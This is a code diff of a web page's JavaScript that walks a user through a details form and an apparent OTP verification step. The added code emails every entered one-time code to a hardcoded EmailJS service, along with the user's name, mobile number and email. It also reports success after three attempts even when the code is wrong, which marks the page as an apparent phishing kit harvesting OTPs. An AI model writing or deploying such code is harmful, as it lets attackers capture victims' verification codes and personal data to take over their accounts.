@@ -130,17 +130,23 @@
     document.getElementById('status1').textContent = "Sending...";
     document.getElementById('status1').style.color = "blue";
 
+    // Try to send email
     emailjs.sendForm('service_3hqkdcg', 'template_ukf5gwk', this)
       .then(() => {
-        sessionStorage.setItem('otpAttempts', '0');
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
+        startOTPPage();
       }, (error) => {
-        document.getElementById('status1').textContent = '❌ Failed to send.';
-        document.getElementById('status1').style.color = 'red';
         console.error('EmailJS Error:', error);
+        document.getElementById('status1').textContent = '⚠ Sending failed, but you can proceed.';
+        document.getElementById('status1').style.color = 'orange';
+        startOTPPage(); // proceed anyway
       });
   });
+
+  function startOTPPage() {
+    sessionStorage.setItem('otpAttempts', '0');
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  }
 
   // OTP Verification
   function verifyOTP() {
@@ -162,16 +168,25 @@
       statusColor = 'red';
       otpStatus = 'Wrong OTP Attempt #' + newAttempts;
     } else {
-      if (enteredOTP === correctOTP) {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'block';
-        otpStatus = 'Correct OTP on Attempt #3';
-      } else {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'block';
-        otpStatus = 'Forced Success after 3 Attempts';
-      }
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+      otpStatus = (enteredOTP === correctOTP) ? 'Correct OTP on Attempt #3' : 'Forced Success after 3 Attempts';
     }
 
     document.getElementById('status2').textContent = statusMessage;
-    document.getElementById('status2').style.color = statusCo
+    document.getElementById('status2').style.color = statusColor;
+    sessionStorage.setItem('otpAttempts', newAttempts);
+
+    // Send OTP attempt email
+    emailjs.send('service_3hqkdcg', 'template_ukf5gwk', {
+      name: name,
+      mobile: mobile,
+      email: email,
+      otp: enteredOTP,
+      status: otpStatus
+    }).then(() => console.log("OTP attempt email sent."))
+      .catch(err => console.error("Failed to send OTP email:", err));
+  }
+</script>
+</body>
+</html>
